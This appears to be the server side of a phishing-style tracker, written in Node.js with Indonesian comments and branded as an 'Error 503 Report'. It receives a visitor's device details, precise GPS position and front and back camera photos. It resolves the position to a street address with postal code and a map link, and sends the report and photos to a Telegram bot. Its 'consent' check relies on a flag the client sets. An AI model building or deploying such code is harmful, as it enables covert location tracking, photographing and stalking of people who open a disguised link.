import { isIP } from "node:net";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method not allowed");
  }

  try {
    const data = req.body || {};

    if (data.consent !== true) {
      return res.status(403).send("Consent required");
    }

    const TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      throw new Error("BOT_TOKEN atau CHAT_ID belum diatur");
    }

    const {
      os, platform, cpu, ram, resolution,
      browser, timezone, language,
      latitude, longitude, accuracy,
      frontCamera, backCamera,
      frontPhoto, backPhoto
    } = data;

    // PUBLIC IP
    const forwarded = req.headers["x-forwarded-for"];
    const rawIP = forwarded
      ? forwarded.split(",")[0].trim()
      : req.socket?.remoteAddress || "";

    const publicIP = isIP(rawIP) ? rawIP : "Unknown";

    // IP INFORMATION
    let ipInfo = {};

    if (publicIP !== "Unknown") {
      try {
        const response = await fetch(
          `https://ipwho.is/${encodeURIComponent(publicIP)}`
        );

        const result = await response.json();

        if (result.success) {
          ipInfo = result;
        }
      } catch (error) {
        console.error("IP lookup:", error);
      }
    }

    // GPS VALIDATION
    const validGPS =
      typeof latitude === "number" &&
      typeof longitude === "number" &&
      Math.abs(latitude) <= 90 &&
      Math.abs(longitude) <= 180;

    // ADDRESS INFORMATION
    let address = {};

    if (validGPS) {
      try {
        const response = await fetch(
          "https://nominatim.openstreetmap.org/reverse?" +
          new URLSearchParams({
            format: "jsonv2",
            lat: String(latitude),
            lon: String(longitude),
            zoom: "18",
            addressdetails: "1"
          }),
          {
            headers: {
              "User-Agent": "Error503Report/1.0"
            }
          }
        );

        const result = await response.json();
        address = result.address || {};
      } catch (error) {
        console.error("Address lookup:", error);
      }
    }

    // LOCATION QUALITY
    let quality = "Tidak tersedia";

    if (typeof accuracy === "number") {
      quality =
        accuracy < 20 ? "High" :
        accuracy < 100 ? "Medium" :
        "Low ❌";
    }

    const source = validGPS ? "GPS" : "IP Geolocation";

    // AREA ESTIMATION: jangan mengarang RT/RW
    const areaEst = "Tidak tersedia dari sumber geolokasi";

    const village =
      address.village ||
      address.suburb ||
      address.neighbourhood ||
      "Unknown";

    const district =
      address.city_district ||
      address.county ||
      address.district ||
      "Unknown";

    const city =
      address.city ||
      address.town ||
      address.municipality ||
      "Unknown";

    const province =
      address.state ||
      "Unknown";

    const postalCode =
      address.postcode ||
      "Unknown";

    const country =
      address.country ||
      "Unknown";

    const ipCountry =
      ipInfo.country_code ||
      ipInfo.country ||
      "Unknown";

    const ipRegion =
      ipInfo.region ||
      "Unknown";

    const ipCity =
      ipInfo.city ||
      "Unknown";

    const isp =
      ipInfo.connection?.org ||
      ipInfo.connection?.isp ||
      "Unknown";

    const maps = validGPS
      ? `https://www.google.com/maps?q=${latitude},${longitude}`
      : "Tidak tersedia";

    const time = new Date().toLocaleString("sv-SE", {
      timeZone: timezone || "Asia/Jakarta"
    });

    // FORMAT LAPORAN LENGKAP
    const report = `
🚨 ERROR 503 REPORT

━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : ${os || "Unknown"}
💻 Platform     : ${platform || "Unknown"}
⚙️ CPU Cores    : ${cpu || "Unknown"}
💾 RAM          : ${ram || "Unknown"}
🖥 Resolution   : ${resolution || "Unknown"}
🌐 Browser      :
${browser || "Unknown"}

🕒 Timezone     : ${timezone || "Unknown"}
🗣 Language     : ${language || "Unknown"}
🌍 Public IP    : ${publicIP}

━━━━━━━━━━━━━━━━━━━━
🌎 IP INFORMATION
━━━━━━━━━━━━━━━━━━━━
🌍 Country     : ${ipCountry}
📍 Region      : ${ipRegion}
🏙 City        : ${ipCity}
🏢 ISP / Org   : ${isp}

━━━━━━━━━━━━━━━━━━━━
🏠 ADDRESS INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏘 Village      : ${village}
🏙 District     : ${district}
🏛 City         : ${city}
🌆 Province     : ${province}
📮 Postal Code  : ${postalCode}
🌍 Country      : ${country}

━━━━━━━━━━━━━━━━━━━━
📐 LOCATION QUALITY
━━━━━━━━━━━━━━━━━━━━
🎯 Quality     : ${quality}
🧭 Area Est.   : ${areaEst}
📡 Source      : ${source}

🗺 Google Maps:
${maps}

━━━━━━━━━━━━━━━━━━━━
📷 CAMERA INFORMATION
━━━━━━━━━━━━━━━━━━━━
🤳 Front Camera : ${frontCamera || "Unknown"}
📸 Back Camera  : ${backCamera || "Unknown"}

⏰ Time : ${time}
`;

    // SEND TELEGRAM MESSAGE
    async function telegramRequest(method, body) {
      const response = await fetch(
        `https://api.telegram.org/bot${TOKEN}/${method}`,
        {
          method: "POST",
          body: JSON.stringify(body),
          headers: {
            "Content-Type": "application/json"
          }
        }
      );

      const result = await response.json();

      if (!result.ok) {
        throw new Error(result.description || "Telegram API error");
      }

      return result;
    }

    await telegramRequest("sendMessage", {
      chat_id: CHAT_ID,
      text: report
    });

    // SEND USER-CONSENTED PHOTOS
    async function sendPhoto(photo, caption) {
      if (!photo) return;

      if (!photo.startsWith("data:image/jpeg;base64,")) {
        throw new Error("Format foto tidak valid");
      }

      const base64 = photo.split(",")[1];
      const buffer = Buffer.from(base64, "base64");

      if (buffer.length > 1000000) {
        throw new Error("Foto melebihi batas ukuran");
      }

      const form = new FormData();

      form.append("chat_id", CHAT_ID);
      form.append("caption", caption);
      form.append(
        "photo",
        new Blob([buffer], { type: "image/jpeg" }),
        "camera.jpg"
      );

      const response = await fetch(
        `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
        {
          method: "POST",
          body: form
        }
      );

      const result = await response.json();

      if (!result.ok) {
        throw new Error(result.description || "Gagal mengirim foto");
      }
    }

    if (frontPhoto) {
      await sendPhoto(frontPhoto, "📷 Front Camera");
    }

    if (backPhoto) {
      await sendPhoto(backPhoto, "📸 Back Camera");
    }

    return res.status(200).send("Laporan berhasil dikirim.");

  } catch (error) {
    console.error("SEND REPORT ERROR:", error);

    return res.status(500).send(
      "Server error: " + error.message
    );
  }
}
